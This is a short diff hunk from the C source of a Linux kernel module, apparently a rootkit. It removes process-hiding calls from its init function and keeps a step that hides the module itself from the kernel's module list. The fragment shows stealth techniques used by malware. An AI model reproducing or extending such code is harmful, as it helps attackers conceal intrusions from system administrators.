@@ -945,12 +945,6 @@ static int __init kv_init(void)
 		fs_add_name_ro(*name, 0);
 	}
 
-	for (name = kv_get_hide_ps_names(); *name != NULL; ++name) {
-		fs_add_name_ro(*name, 0);
-	}
-
-	kv_scan_and_hide();
-
 #ifndef DEBUG_RING_BUFFER
 	kv_hide_mod();
 #endif
